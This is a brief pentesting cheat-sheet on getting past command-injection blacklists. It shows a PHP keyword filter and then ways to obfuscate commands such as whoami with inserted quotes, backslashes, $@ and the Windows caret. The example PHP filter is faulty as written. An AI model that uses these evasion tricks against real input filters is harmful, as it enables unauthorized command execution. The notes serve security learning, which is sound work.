# Bypassing Blacklisted Commands
***

### Commands Blacklist
#### Example of a basic blacklist filter written in PHP
```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

### Linux and Windows
#### The easiest  technique of obfuscation is inserting certain characters within our command that are usually ignored by shells. Some examples of this type of chars are ``'`` and `"`.
##### Examples:

```bash
$ w'h'o'am'i
root
```

```bash
$ w"ho"a"mi"
root
```
##### **Note** : We can't mix types of quotes and the number of quotes should be even


### Linux Only
#### By using certain characters , like "\\" and `$@`, the bash shell will ignore them an execute the command.
#### Example:
```bash
$ who$@ami
$ w\ho\am\i
```

### Windows Only 
#### In windows there are also characters that we can insert that do not affect the output, like `^`
#### Example:
```commandline
> who^ami
root
```
